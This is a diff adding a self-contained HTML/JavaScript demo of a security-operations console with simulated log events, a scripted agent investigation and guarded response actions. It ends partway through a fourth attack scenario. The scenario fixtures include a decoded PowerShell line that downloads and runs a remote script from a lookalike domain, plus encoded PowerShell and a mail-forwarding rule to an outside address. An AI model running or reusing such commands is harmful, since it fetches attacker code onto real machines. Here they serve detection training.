@@ -1,0 +1,946 @@
+<title>CyberSentry</title>
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Archivo:wght@500;600;700&family=IBM+Plex+Mono:wght@400;500;600&family=IBM+Plex+Sans:wght@400;500;600&display=swap">
+<style>
+/* ── CyberSentry console · committed dark "operations board" identity ─────── */
+:root{
+  --bg:#0A0E14; --surf:#111722; --surf2:#19202E; --surf3:#222B3C;
+  --line:#243044; --line2:#2F3C52;
+  --ink:#E6EDF6; --dim:#94A3B8; --mute:#64748B;
+  --accent:#7D8BF4; --accent-dim:#4D59B8;
+  --good:#3FBF8F;
+  --sev-low:#4DA3E0; --sev-medium:#E8C24A; --sev-high:#F0702E; --sev-critical:#E03A72;
+  --r:6px; --mono:"IBM Plex Mono",ui-monospace,Menlo,Consolas,monospace;
+  --sans:"IBM Plex Sans",system-ui,-apple-system,sans-serif;
+  --disp:"Archivo","IBM Plex Sans",system-ui,sans-serif;
+}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--ink);font:400 14px/1.5 var(--sans);
+  -webkit-font-smoothing:antialiased}
+h1,h2,h3,h4{font-family:var(--disp);font-weight:600;margin:0;text-wrap:balance;letter-spacing:-.01em}
+button{font:inherit;color:inherit;cursor:pointer;border:0;background:none}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+.mono{font-family:var(--mono);font-variant-numeric:tabular-nums}
+.eyebrow{font:600 10px/1 var(--mono);letter-spacing:.14em;text-transform:uppercase;color:var(--mute)}
+@media (prefers-reduced-motion:reduce){*{animation-duration:.001ms!important;transition-duration:.001ms!important}}
+
+/* ── Login ────────────────────────────────────────────────────────────────── */
+#login{min-height:100vh;display:grid;place-items:center;padding:24px 16px}
+.lwrap{width:100%;max-width:380px}
+.brandmark{display:flex;align-items:center;gap:10px;margin-bottom:26px}
+.shield{width:34px;height:34px;flex:0 0 34px}
+.brandmark b{font:700 22px var(--disp);letter-spacing:-.02em}
+.brandmark .tag{font:600 9px/1 var(--mono);letter-spacing:.18em;color:var(--mute);text-transform:uppercase}
+.lcard{background:var(--surf);border:1px solid var(--line);border-radius:10px;padding:24px}
+.field{display:block;margin-bottom:14px}
+.field span{display:block;font:600 10px/1 var(--mono);letter-spacing:.12em;text-transform:uppercase;color:var(--dim);margin-bottom:6px}
+.field input{width:100%;padding:9px 11px;background:var(--bg);border:1px solid var(--line2);
+  border-radius:var(--r);color:var(--ink);font:500 14px var(--mono)}
+.field input:focus{border-color:var(--accent);outline:none}
+.btn{display:inline-flex;align-items:center;justify-content:center;gap:7px;padding:9px 15px;
+  border-radius:var(--r);background:var(--surf3);border:1px solid var(--line2);font-weight:500;
+  transition:background .12s,border-color .12s}
+.btn:hover{background:var(--line2);border-color:var(--mute)}
+.btn-primary{background:var(--accent);border-color:var(--accent);color:#0B0F18;font-weight:600}
+.btn-primary:hover{background:#949FF7;border-color:#949FF7}
+.btn-good{background:var(--good);border-color:var(--good);color:#06160F;font-weight:600}
+.btn-good:hover{background:#55CEA0;border-color:#55CEA0}
+.btn-wide{width:100%}
+.btn:disabled{opacity:.4;cursor:not-allowed}
+.btn-sm{padding:5px 10px;font-size:12.5px}
+.hint{margin-top:14px;padding-top:14px;border-top:1px solid var(--line);font-size:12px;color:var(--mute);line-height:1.7}
+.hint b{color:var(--dim);font-family:var(--mono);font-weight:500}
+.role-pick{display:flex;gap:8px;margin-bottom:16px}
+.role-pick button{flex:1;padding:8px;border:1px solid var(--line2);border-radius:var(--r);
+  font:600 11px/1.4 var(--mono);letter-spacing:.06em;text-transform:uppercase;color:var(--dim)}
+.role-pick button[aria-pressed="true"]{border-color:var(--accent);color:var(--ink);background:#1B2039}
+
+/* ── Shell ────────────────────────────────────────────────────────────────── */
+#shell{display:grid;grid-template-columns:208px 1fr;min-height:100vh}
+#side{background:var(--surf);border-right:1px solid var(--line);padding:16px 12px;
+  display:flex;flex-direction:column;gap:4px;position:sticky;top:0;height:100vh}
+#side .brandmark{margin:4px 4px 20px}
+#side .brandmark b{font-size:17px}
+.nav{display:block;width:100%;text-align:left;padding:8px 10px;border-radius:var(--r);color:var(--dim);
+  font-weight:500;display:flex;align-items:center;gap:9px;transition:background .12s,color .12s}
+.nav:hover{background:var(--surf2);color:var(--ink)}
+.nav[aria-current="page"]{background:#1B2039;color:var(--ink);box-shadow:inset 2px 0 0 var(--accent)}
+.nav .ct{margin-left:auto;font:600 10.5px var(--mono);padding:1px 6px;border-radius:9px;
+  background:var(--surf3);color:var(--dim)}
+.nav .ct.hot{background:var(--sev-critical);color:#fff}
+.spacer{flex:1}
+.whoami{padding:10px;border-top:1px solid var(--line);font-size:12px;color:var(--mute);line-height:1.6}
+.whoami b{display:block;color:var(--ink);font-size:13px;font-weight:600}
+#main{min-width:0;display:flex;flex-direction:column}
+#topbar{display:flex;align-items:center;gap:14px;padding:12px 20px;border-bottom:1px solid var(--line);
+  background:#0C1118;position:sticky;top:0;z-index:20;flex-wrap:wrap}
+#topbar h1{font-size:16px;margin-right:auto}
+.pill{display:inline-flex;align-items:center;gap:6px;padding:3px 9px;border-radius:20px;
+  border:1px solid var(--line2);font:500 11.5px var(--mono);color:var(--dim);white-space:nowrap}
+.dot{width:6px;height:6px;border-radius:50%;background:var(--good);flex:0 0 6px}
+.dot.live{animation:beat 1.7s ease-in-out infinite}
+@keyframes beat{0%,100%{opacity:1;box-shadow:0 0 0 0 rgba(63,191,143,.5)}50%{opacity:.65;box-shadow:0 0 0 4px rgba(63,191,143,0)}}
+#view{padding:20px;display:flex;flex-direction:column;gap:18px}
+@media(max-width:860px){
+  #shell{grid-template-columns:1fr}
+  #side{position:static;height:auto;flex-direction:row;flex-wrap:wrap;align-items:center;gap:6px}
+  #side .brandmark{margin:0 12px 0 4px}
+  #side .spacer,#side .whoami{display:none}
+  .nav{width:auto}
+  #view{padding:16px}
+}
+
+/* ── Primitives ───────────────────────────────────────────────────────────── */
+.card{background:var(--surf);border:1px solid var(--line);border-radius:9px}
+.card>header{display:flex;align-items:center;gap:10px;padding:12px 14px;border-bottom:1px solid var(--line);flex-wrap:wrap}
+.card>header h3{font-size:13.5px}
+.card>header .eyebrow{margin-left:auto}
+.card .body{padding:14px}
+.grid{display:grid;gap:14px}
+.sev{display:inline-flex;align-items:center;gap:6px;padding:2px 8px 2px 6px;border-radius:4px;
+  font:600 10.5px/1.6 var(--mono);letter-spacing:.08em;text-transform:uppercase;white-space:nowrap}
+.sev::before{content:"";width:3px;height:11px;border-radius:2px;background:currentColor}
+.sev-low{color:var(--sev-low);background:rgba(77,163,224,.13)}
+.sev-medium{color:var(--sev-medium);background:rgba(232,194,74,.13)}
+.sev-high{color:var(--sev-high);background:rgba(240,112,46,.14)}
+.sev-critical{color:var(--sev-critical);background:rgba(224,58,114,.15)}
+.tag{display:inline-block;padding:2px 7px;border-radius:4px;background:var(--surf3);
+  font:500 11px var(--mono);color:var(--dim)}
+.tag-mitre{background:#1C2338;color:#9FB0D8;border:1px solid #2C3755}
+.tag-ok{background:rgba(63,191,143,.13);color:var(--good)}
+.tag-wait{background:rgba(232,194,74,.14);color:var(--sev-medium)}
+.tag-no{background:var(--surf3);color:var(--mute)}
+.tag-undo{background:rgba(125,139,244,.14);color:#9BA6F7}
+.empty{padding:34px 16px;text-align:center;color:var(--mute);font-size:13px;line-height:1.7}
+
+/* ── KPI row ──────────────────────────────────────────────────────────────── */
+.kpis{display:grid;grid-template-columns:repeat(auto-fit,minmax(142px,1fr));gap:1px;
+  background:var(--line);border:1px solid var(--line);border-radius:9px;overflow:hidden}
+.kpi{background:var(--surf);padding:13px 15px}
+.kpi .k{font:600 10px/1 var(--mono);letter-spacing:.12em;text-transform:uppercase;color:var(--mute)}
+.kpi .v{font:600 27px/1.15 var(--disp);margin-top:7px;font-variant-numeric:tabular-nums;letter-spacing:-.02em}
+.kpi .u{font-size:14px;color:var(--dim);font-weight:500;margin-left:2px}
+.kpi .s{font-size:11.5px;color:var(--mute);margin-top:3px}
+.kpi.flash .v{animation:flash .9s ease-out}
+@keyframes flash{0%{color:var(--accent)}100%{color:var(--ink)}}
+
+/* ── Red-team console ─────────────────────────────────────────────────────── */
+.redteam{border-color:#3A2432;background:linear-gradient(180deg,#15121A,#111722)}
+.atk{display:grid;grid-template-columns:repeat(auto-fit,minmax(168px,1fr));gap:9px}
+.atk button{text-align:left;padding:10px 12px;border:1px solid var(--line2);border-radius:var(--r);
+  background:var(--surf2);transition:border-color .12s,transform .12s}
+.atk button:hover:not(:disabled){border-color:var(--sev-critical);transform:translateY(-1px)}
+.atk button b{display:block;font:600 13px var(--disp)}
+.atk button span{font:500 10.5px var(--mono);color:var(--mute);letter-spacing:.05em}
+
+/* ── Charts ───────────────────────────────────────────────────────────────── */
+.sevchart{display:flex;flex-direction:column;gap:9px}
+.sevrow{display:grid;grid-template-columns:76px 1fr 30px;align-items:center;gap:10px}
+.sevrow .track{height:9px;border-radius:5px;background:var(--surf3);overflow:hidden}
+.sevrow .fill{height:100%;border-radius:5px;transition:width .5s cubic-bezier(.3,1,.4,1)}
+.sevrow .n{font:600 13px var(--mono);text-align:right;color:var(--ink)}
+.sevrow .n.zero{color:var(--mute)}
+.volwrap{position:relative}
+.vol{display:flex;align-items:flex-end;gap:2px;height:84px}
+.vol div{flex:1;background:var(--surf3);border-radius:2px 2px 0 0;min-height:2px;transition:height .4s,background .4s}
+.vol div.spike{background:var(--sev-critical)}
+.vol div:hover{background:var(--accent)}
+.axis{display:flex;justify-content:space-between;margin-top:6px;font:500 10px var(--mono);color:var(--mute)}
+#tip{position:fixed;z-index:60;pointer-events:none;background:#060910;border:1px solid var(--line2);
+  border-radius:var(--r);padding:6px 9px;font:500 11.5px var(--mono);white-space:nowrap;
+  box-shadow:0 6px 20px rgba(0,0,0,.6)}
+
+/* ── Live feed ────────────────────────────────────────────────────────────── */
+.feed{max-height:330px;overflow-y:auto;font-family:var(--mono);font-size:11.5px}
+.fr{display:grid;grid-template-columns:62px 1fr;gap:10px;padding:5px 14px;border-bottom:1px solid #1A2130;
+  animation:slidein .32s ease-out}
+.fr:last-child{border-bottom:0}
+.fr time{color:var(--mute)}
+.fr .m{color:var(--dim);overflow-wrap:anywhere}
+.fr.hostile .m{color:#F3B7C9}
+.fr.hostile{background:rgba(224,58,114,.06)}
+@keyframes slidein{from{opacity:0;transform:translateY(-5px)}to{opacity:1;transform:none}}
+
+/* ── Incident list ────────────────────────────────────────────────────────── */
+.ilist{display:flex;flex-direction:column}
+.irow{display:grid;grid-template-columns:38px 1fr auto;gap:12px;align-items:center;width:100%;
+  text-align:left;padding:12px 14px;border-bottom:1px solid var(--line);transition:background .12s}
+.irow:last-child{border-bottom:0}
+.irow:hover{background:var(--surf2)}
+.irow.fresh{animation:arrive 1.1s ease-out}
+@keyframes arrive{0%{background:rgba(224,58,114,.22)}100%{background:transparent}}
+.risk{width:38px;height:38px;border-radius:50%;display:grid;place-items:center;
+  font:600 13px var(--mono);border:2px solid currentColor;flex:0 0 38px}
+.irow .t{font-weight:500;line-height:1.35;overflow-wrap:anywhere}
+.irow .meta{display:flex;gap:8px;align-items:center;margin-top:5px;flex-wrap:wrap}
+.chev{color:var(--mute);font-size:17px}
+@media(max-width:600px){.irow{grid-template-columns:38px 1fr}.chev{display:none}}
+
+/* ── Incident detail ──────────────────────────────────────────────────────── */
+.detail{display:grid;grid-template-columns:minmax(0,1fr) minmax(0,1.25fr);gap:18px;align-items:start}
+@media(max-width:1000px){.detail{grid-template-columns:1fr}}
+.tl{display:flex;flex-direction:column}
+.tlrow{display:grid;grid-template-columns:14px 1fr;gap:11px;padding:0 0 14px;position:relative}
+.tlrow:last-child{padding-bottom:0}
+.tlrow::before{content:"";position:absolute;left:6px;top:14px;bottom:0;width:1px;background:var(--line2)}
+.tlrow:last-child::before{display:none}
+.tlmark{width:9px;height:9px;border-radius:50%;background:var(--line2);margin:4px 0 0 2px;z-index:1}
+.tlmark.hostile{background:var(--sev-critical);box-shadow:0 0 0 3px rgba(224,58,114,.2)}
+.tlrow .when{font:500 10.5px var(--mono);color:var(--mute)}
+.tlrow .what{font-size:13px;line-height:1.45;margin-top:2px;overflow-wrap:anywhere}
+.tlrow .what b{font-weight:600}
+.kv{display:grid;grid-template-columns:116px 1fr;gap:8px 12px;font-size:13px}
+.kv dt{color:var(--mute);font:500 11px var(--mono);letter-spacing:.06em;text-transform:uppercase;padding-top:2px}
+.kv dd{margin:0;line-height:1.55}
+.chain{display:flex;flex-direction:column;gap:7px;counter-reset:s}
+.chain li{display:flex;gap:9px;font-size:13px;line-height:1.45;list-style:none}
+.chain li::before{counter-increment:s;content:counter(s);flex:0 0 18px;height:18px;border-radius:4px;
+  background:var(--surf3);color:var(--dim);font:600 10.5px/18px var(--mono);text-align:center;margin-top:1px}
+.chain{padding:0;margin:0}
+.aibar{display:flex;align-items:center;gap:10px;padding:10px 14px;background:#141A2B;
+  border-bottom:1px solid var(--line);flex-wrap:wrap}
+.tools{display:flex;flex-direction:column;gap:0;font-family:var(--mono);font-size:12px}
+.tool{display:grid;grid-template-columns:16px 1fr auto;gap:9px;align-items:start;padding:7px 14px;
+  border-bottom:1px solid #1A2130;animation:slidein .3s ease-out}
+.tool:last-child{border-bottom:0}
+.tool .ico{width:14px;height:14px;margin-top:2px}
+.tool .nm{color:var(--ink);overflow-wrap:anywhere}
+.tool .nm i{color:var(--mute);font-style:normal}
+.tool .out{color:var(--dim);font-size:11px;margin-top:3px;display:block;overflow-wrap:anywhere}
+.tool .ms{color:var(--mute);font-size:11px;white-space:nowrap}
+.spin{width:12px;height:12px;border:2px solid var(--line2);border-top-color:var(--accent);
+  border-radius:50%;animation:spin .7s linear infinite;margin-top:3px}
+@keyframes spin{to{transform:rotate(360deg)}}
+.typing::after{content:"▌";color:var(--accent);animation:blink 1s step-end infinite}
+@keyframes blink{50%{opacity:0}}
+
+/* ── Actions ──────────────────────────────────────────────────────────────── */
+.act{padding:12px 14px;border-bottom:1px solid var(--line);animation:slidein .3s ease-out}
+.act:last-child{border-bottom:0}
+.act .top{display:flex;align-items:center;gap:9px;flex-wrap:wrap}
+.act code{font:600 12.5px var(--mono);color:var(--ink)}
+.act .arrow{color:var(--mute)}
+.act .tgt{font:500 12.5px var(--mono);color:var(--sev-low)}
+.act .why{font-size:12.5px;color:var(--dim);margin-top:6px;line-height:1.5}
+.act .res{font:500 11.5px var(--mono);color:var(--good);margin-top:6px;display:flex;gap:6px;align-items:flex-start}
+.act .res.undo{color:#9BA6F7}
+.act .btns{display:flex;gap:7px;margin-top:9px;flex-wrap:wrap}
+.risktag{font:600 10px var(--mono);letter-spacing:.1em;text-transform:uppercase;padding:2px 7px;border-radius:4px}
+.risk-low{background:rgba(63,191,143,.13);color:var(--good)}
+.risk-medium{background:rgba(232,194,74,.14);color:var(--sev-medium)}
+.risk-high{background:rgba(224,58,114,.14);color:var(--sev-critical)}
+.gate{display:flex;gap:9px;align-items:flex-start;padding:11px 14px;background:#141A2B;
+  border-bottom:1px solid var(--line);font-size:12.5px;color:var(--dim);line-height:1.5}
+.gate b{color:var(--ink);font-weight:600}
+
+/* ── Audit ────────────────────────────────────────────────────────────────── */
+.tblwrap{overflow-x:auto}
+table{width:100%;border-collapse:collapse;font-size:12.5px}
+th{text-align:left;padding:9px 14px;border-bottom:1px solid var(--line);
+  font:600 10px var(--mono);letter-spacing:.12em;text-transform:uppercase;color:var(--mute);white-space:nowrap}
+td{padding:9px 14px;border-bottom:1px solid #1A2130;vertical-align:top}
+tr:last-child td{border-bottom:0}
+td.h{font-family:var(--mono);font-size:11.5px;color:var(--dim);white-space:nowrap}
+td.h .ok{color:var(--good)}
+.linkbad{color:var(--sev-critical)}
+.toast{position:fixed;left:50%;bottom:24px;transform:translateX(-50%);z-index:70;
+  background:#060910;border:1px solid var(--line2);border-left:3px solid var(--good);
+  border-radius:var(--r);padding:11px 16px;font-size:13px;max-width:calc(100vw - 32px);
+  box-shadow:0 10px 32px rgba(0,0,0,.7);animation:slidein .25s ease-out}
+.toast.warn{border-left-color:var(--sev-medium)}
+</style>
+
+<svg width="0" height="0" style="position:absolute" aria-hidden="true"><defs>
+  <symbol id="i-shield" viewBox="0 0 24 24"><path d="M12 2.2 4 5.4v6c0 5 3.4 9.3 8 10.4 4.6-1.1 8-5.4 8-10.4v-6L12 2.2Z" fill="none" stroke="#7D8BF4" stroke-width="1.6"/><path d="M8.6 12.1 11 14.6l4.6-4.9" fill="none" stroke="#3FBF8F" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"/></symbol>
+  <symbol id="i-check" viewBox="0 0 16 16"><path d="M3 8.4 6.2 11.6 13 4.8" fill="none" stroke="#3FBF8F" stroke-width="2.1" stroke-linecap="round" stroke-linejoin="round"/></symbol>
+  <symbol id="i-lock" viewBox="0 0 16 16"><rect x="3" y="7" width="10" height="7" rx="1.6" fill="none" stroke="#E8C24A" stroke-width="1.5"/><path d="M5.5 7V5.2a2.5 2.5 0 0 1 5 0V7" fill="none" stroke="#E8C24A" stroke-width="1.5"/></symbol>
+  <symbol id="i-bolt" viewBox="0 0 16 16"><path d="M9 1.5 3.5 9h3.2L7 14.5 12.5 7H9.3L9 1.5Z" fill="#E03A72"/></symbol>
+</defs></svg>
+
+<div id="app"></div>
+
+<script>
+"use strict";
+/* ═══════════════════════════════════════════════════════════════════════════
+   CyberSentry — demo prototype.
+   The backend is simulated in-page: real event generators, real rule logic,
+   a scripted agent investigation, and the real guard-rail policy
+   (low/medium risk auto-executes · high risk waits for a human).
+   ═══════════════════════════════════════════════════════════════════════════ */
+
+const $ = (s, r = document) => r.querySelector(s);
+const esc = s => String(s).replace(/[&<>"]/g, c => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;" }[c]));
+const pad = n => String(n).padStart(2, "0");
+const hhmmss = d => pad(d.getHours()) + ":" + pad(d.getMinutes()) + ":" + pad(d.getSeconds());
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+const nextId = (() => { let n = 1040; return () => ++n; })();
+
+/* FNV-1a — gives the audit trail a real, verifiable hash chain. */
+function fnv(str) {
+  let h = 0x811c9dc5;
+  for (let i = 0; i < str.length; i++) { h ^= str.charCodeAt(i); h = Math.imul(h, 0x01000193) >>> 0; }
+  return h.toString(16).padStart(8, "0");
+}
+
+const S = {
+  route: "dashboard", user: null, events: [], incidents: [], actions: [], audit: [],
+  ingested: 1247, benign: 1247, openId: null, busy: false, fresh: null, toast: null,
+  vol: Array.from({ length: 24 }, (_, i) => 18 + Math.round(26 * Math.sin((i - 3) / 3.4) ** 2) + (i % 3) * 4),
+};
+
+/* ── Benign background traffic, so the console is never a dead screen ────── */
+const NOISE = [
+  ["auth", "login_success", u => `login_success  user=${u} src=10.14.3.${r(2, 240)} host=${host()}  mfa=ok`],
+  ["auth", "login_failed", u => `login_failed   user=${u} src=10.14.3.${r(2, 240)} reason=bad_password  attempt=1`],
+  ["endpoint", "process_start", u => `process_start  host=${host()} proc=chrome.exe user=${u}  signed=true`],
+  ["network", "dns_query", () => `dns_query      host=${host()} domain=teams.microsoft.com  verdict=allow`],
+  ["network", "conn_allow", () => `conn_allow     ${host()} → 52.113.194.${r(2, 240)}:443  bytes=${r(2, 90)}kB`],
+  ["endpoint", "patch_applied", () => `patch_applied  host=${host()} kb=KB50${r(10, 99)}41  status=ok`],
+  ["auth", "vpn_connect", u => `vpn_connect    user=${u} src=49.37.${r(2, 240)}.${r(2, 240)} geo=IN/Hyderabad`],
+];
+const USERS = ["a.sharma", "m.iyer", "t.nguyen", "p.dsouza", "k.brennan", "l.fischer", "n.rao"];
+const r = (a, b) => a + Math.floor(Math.random() * (b - a + 1));
+const host = () => `WS-${["FIN", "ENG", "HR", "OPS"][r(0, 3)]}-${pad(r(1, 60))}`;
+
+function pushEvent(ev) {
+  S.events.unshift({ id: nextId(), at: new Date(), ...ev });
+  if (S.events.length > 160) S.events.pop();
+  S.ingested++;
+  S.vol[23] = Math.min(140, S.vol[23] + 1);
+}
+function noiseTick() {
+  if (!S.user) return;
+  const [source, type, msg] = NOISE[r(0, NOISE.length - 1)];
+  pushEvent({ source, type, msg: msg(USERS[r(0, USERS.length - 1)]), hostile: false });
+  S.benign++;
+  if (S.route === "dashboard") paintFeed(), paintKpis();
+}
+setInterval(noiseTick, 1100);
+
+/* ═══ Attack scenarios — the five test cases from the build guide ═════════ */
+const SCENARIOS = {
+  S1: {
+    label: "Brute force → compromise", mitre: "T1110", rule: "R1_BRUTE_FORCE",
+    events: [
+      { source: "auth", type: "login_failed", msg: "login_failed   user=j.martinez src=203.0.113.47 geo=—/Tor-exit  attempt=1", hostile: true },
+      { source: "auth", type: "login_failed", msg: "login_failed   user=j.martinez src=203.0.113.47 geo=—/Tor-exit  attempt=12", hostile: true },
+      { source: "auth", type: "login_failed", msg: "login_failed   user=j.martinez src=203.0.113.47 geo=—/Tor-exit  attempt=27", hostile: true },
+      { source: "auth", type: "login_failed", msg: "login_failed   user=j.martinez src=203.0.113.47 geo=—/Tor-exit  attempt=40", hostile: true },
+      { source: "auth", type: "login_success", msg: "login_success  user=j.martinez src=203.0.113.47 host=FIN-WS-014  mfa=NOT_ENROLLED", hostile: true },
+      { source: "auth", type: "token_issued", msg: "token_issued   user=j.martinez scope=finance.read,finance.write  ttl=8h", hostile: true },
+    ],
+    incident: {
+      title: "Brute-force succeeded on j.martinez from 203.0.113.47", severity: "critical",
+      confidence: 0.94, risk: 96,
+      evidence: "41 authentication attempts from a single Tor exit node in 6 min 12 s, followed by a success.",
+    },
+    tools: [
+      ["search_events", "username='j.martinez', minutes_back=60", "41 events · 40 login_failed, 1 login_success — all from 203.0.113.47", 180],
+      ["check_ip_reputation", "ip='203.0.113.47'", "malicious (score 92/100) · Tor exit node · 3 abuse feeds · 14 prior brute-force reports", 240],
+      ["get_user_history", "username='j.martinez'", "Baseline: IN/Hyderabad, 09:00–19:00 IST, MFA never enrolled. No prior foreign login.", 210],
+      ["get_asset_info", "hostname='FIN-WS-014'", "Finance workstation · criticality HIGH · mounts \\\\fileserv\\finance-payroll", 160],
+    ],
+    report: {
+      summary: "An external actor password-sprayed the finance analyst account j.martinez from a Tor exit node and succeeded on the 41st attempt. A live session token with finance read/write scope was issued. The account is compromised and the attacker currently holds valid access to payroll data.",
+      cause: "The account was never enrolled in MFA and its password appears in a known breach corpus, so credential stuffing alone was enough. No lockout threshold was enforced on the finance OU.",
+      chain: [
+        "Reconnaissance — attacker enumerates valid usernames from the public staff directory.",
+        "Credential access (T1110.003) — 40 password-spray attempts against j.martinez from 203.0.113.47.",
+        "Initial access (T1078.004) — attempt 41 succeeds; no MFA challenge is raised.",
+        "Persistence — an 8-hour OAuth token with finance.write scope is issued to the attacker.",
+      ],
+      mitre: [["T1110.003", "Password Spraying"], ["T1078.004", "Valid Accounts: Cloud"]],
+      assets: ["j.martinez (user)", "FIN-WS-014 (host)", "203.0.113.47 (external IP)", "\\\\fileserv\\finance-payroll"],
+    },
+    actions: [
+      ["block_ip", "203.0.113.47", "low", "Source of all 41 attempts and the successful login. No legitimate traffic has ever originated from this address."],
+      ["revoke_sessions", "j.martinez", "medium", "Invalidates the 8-hour finance.write token the attacker is holding right now."],
+      ["reset_password", "j.martinez", "medium", "Credential is in a public breach corpus and must be rotated before the account is restored."],
+      ["disable_user", "j.martinez", "high", "Full lockout until the analyst re-verifies identity. Blocks a finance user from working, so a human must approve."],
+    ],
+  },
+  S2: {
+    label: "Impossible travel", mitre: "T1078", rule: "R2_IMPOSSIBLE_TRAVEL",
+    events: [
+      { source: "auth", type: "login_success", msg: "login_success  user=r.kapoor src=49.37.112.8 geo=IN/Hyderabad  mfa=ok", hostile: false },
+      { source: "auth", type: "login_success", msg: "login_success  user=r.kapoor src=185.220.101.9 geo=RU/Moscow  mfa=bypassed_cookie", hostile: true },
+      { source: "auth", type: "mailbox_rule", msg: "mailbox_rule   user=r.kapoor rule='fwd:*→ext-archive@mail.ru'  action=create", hostile: true },
+    ],
+    incident: {
+      title: "Impossible travel for r.kapoor — IN → RU in 18 minutes", severity: "high",
+      confidence: 0.87, risk: 81,
+      evidence: "Two successful logins 5,400 km apart within 18 minutes; the second bypassed MFA with a replayed session cookie.",
+    },
+    tools: [
+      ["search_events", "username='r.kapoor', minutes_back=120", "2 login_success from 2 countries · 1 mailbox_rule created after the RU login", 190],
+      ["check_ip_reputation", "ip='185.220.101.9'", "suspicious (score 74/100) · known residential-proxy range · 2 abuse feeds", 230],
+      ["get_user_history", "username='r.kapoor'", "No foreign login in 180 days. No approved travel request on file.", 200],
+    ],
+    report: {
+      summary: "The account r.kapoor authenticated from Hyderabad and then from Moscow 18 minutes later — physically impossible. The second session skipped MFA by replaying a stolen session cookie, then created a mail-forwarding rule to an external address, which is a classic post-compromise collection step.",
+      cause: "A session cookie was stolen (most likely infostealer malware on the user's endpoint) and replayed from a residential proxy. Conditional access did not re-challenge MFA on a new geography.",
+      chain: [
+        "Legitimate login from IN/Hyderabad at 09:14 — session cookie issued.",
+        "Cookie theft and replay from RU/Moscow at 09:32 (T1078) — MFA not re-challenged.",
+        "Collection — an auto-forward rule to ext-archive@mail.ru is created on the mailbox.",
+      ],
+      mitre: [["T1078", "Valid Accounts"], ["T1114.003", "Email Forwarding Rule"]],
+      assets: ["r.kapoor (user)", "185.220.101.9 (external IP)", "Exchange mailbox r.kapoor"],
+    },
+    actions: [
+      ["block_ip", "185.220.101.9", "low", "Residential-proxy address used for the replayed session. No legitimate use."],
+      ["revoke_sessions", "r.kapoor", "medium", "Kills the replayed cookie, which is the attacker's only foothold."],
+      ["notify_team", "soc-oncall", "low", "Escalate for endpoint forensics — the cookie theft implies malware on the user's device."],
+      ["disable_user", "r.kapoor", "high", "Precautionary lockout pending endpoint sweep. Needs human approval."],
+    ],
+  },
+  S3: {
+    label: "Phishing → malware → C2", mitre: "T1566", rule: "R3_MALWARE_CHAIN",
+    events: [
+      { source: "email", type: "mail_delivered", msg: "mail_delivered to=s.okafor from=billing@vendor-invoices.co  attach=Invoice_2026.pdf.exe  spf=fail", hostile: true },
+      { source: "endpoint", type: "process_start", msg: "process_start  host=ENG-WS-031 proc=Invoice_2026.pdf.exe parent=outlook.exe  signed=false", hostile: true },
+      { source: "endpoint", type: "process_start", msg: "process_start  host=ENG-WS-031 proc=powershell.exe args='-enc SQBFAFgAIAAoAE4...'  parent=Invoice_2026.pdf.exe", hostile: true },
+      { source: "endpoint", type: "persistence", msg: "persistence    host=ENG-WS-031 key=HKCU\\...\\Run value=OneDriveSyncHost  → %APPDATA%\\svc.exe", hostile: true },
+      { source: "network", type: "dns_query", msg: "dns_query      host=ENG-WS-031 domain=updates-cdn-sync.net  age=2d  verdict=newly_registered", hostile: true },
+      { source: "network", type: "beacon", msg: "beacon         ENG-WS-031 → 91.214.63.118:443  interval=60s±3  jitter=5%  bytes=2.1kB", hostile: true },
+    ],
+    incident: {
+      title: "Malware execution chain with active C2 beacon on ENG-WS-031", severity: "critical",
+      confidence: 0.96, risk: 98,
+      evidence: "Unsigned executable from an SPF-failing email spawned encoded PowerShell, wrote a Run key, and is now beaconing on a fixed 60 s interval.",
+    },
+    tools: [
+      ["search_events", "hostname='ENG-WS-031', minutes_back=30", "6 events · mail → exe → encoded powershell → Run key → beacon (chain confirmed)", 200],
+      ["check_ip_reputation", "ip='91.214.63.118'", "malicious (score 97/100) · Cobalt Strike team server · 6 abuse feeds", 250],
+      ["decode_command", "b64='SQBFAFgAIAAoAE4...'", "IEX (New-Object Net.WebClient).DownloadString('hxxp://updates-cdn-sync.net/s.ps1')", 170],
+      ["get_asset_info", "hostname='ENG-WS-031'", "Engineering workstation · criticality HIGH · holds source-repo credentials", 150],
+    ],
+    report: {
+      summary: "A phishing email carrying a double-extension executable was opened on ENG-WS-031. The payload launched base64-encoded PowerShell that downloaded a second-stage script, installed itself under a Run key disguised as OneDriveSyncHost, and opened a 60-second Cobalt Strike beacon to 91.214.63.118. The host is actively controlled by an external operator.",
+      cause: "The mail gateway allowed an executable attachment from a domain that failed SPF, and the endpoint had no block rule for unsigned binaries spawned by Outlook. One user double-click was enough to reach full remote control.",
+      chain: [
+        "Phishing (T1566.001) — Invoice_2026.pdf.exe delivered from an SPF-failing lookalike domain.",
+        "Execution (T1204.002) — the user opens the attachment; outlook.exe spawns the unsigned binary.",
+        "Execution (T1059.001) — encoded PowerShell pulls a second stage from updates-cdn-sync.net.",
+        "Persistence (T1547.001) — Run key 'OneDriveSyncHost' points to %APPDATA%\\svc.exe.",
+        "Command & control (T1071.001) — HTTPS beacon to 91.214.63.118 every 60 s with 5% jitter.",
+      ],
+      mitre: [["T1566.001", "Spearphishing Attachment"], ["T1059.001", "PowerShell"], ["T1547.001", "Registry Run Keys"], ["T1071.001", "Web Protocols (C2)"]],
+      assets: ["ENG-WS-031 (host)", "s.okafor (user)", "91.214.63.118 (C2 server)", "updates-cdn-sync.net (domain)"],
+    },
+    actions: [
+      ["block_domain", "updates-cdn-sync.net", "low", "Second-stage download source. Newly registered, no business use."],
+      ["block_ip", "91.214.63.118", "low", "Active Cobalt Strike C2 endpoint. Cuts the operator's channel immediately."],
+      ["kill_process", "ENG-WS-031/svc.exe", "medium", "Terminates the running beacon process and its PowerShell parent."],
+      ["isolate_host", "ENG-WS-031", "high", "Network-quarantines the workstation for forensics. Cuts an engineer off entirely, so a human must approve."],
+    ],
+  },
+  S4: {
+    label: "Privilege escalation", mitre: "T1136", rule: "R4_PRIV_ESC",
+    events: [
+      { source: "auth", type: "login_success", msg: "login_success  user=a.chen src=10.14.3.88 host=DC-01  via=rdp", hostile: false },
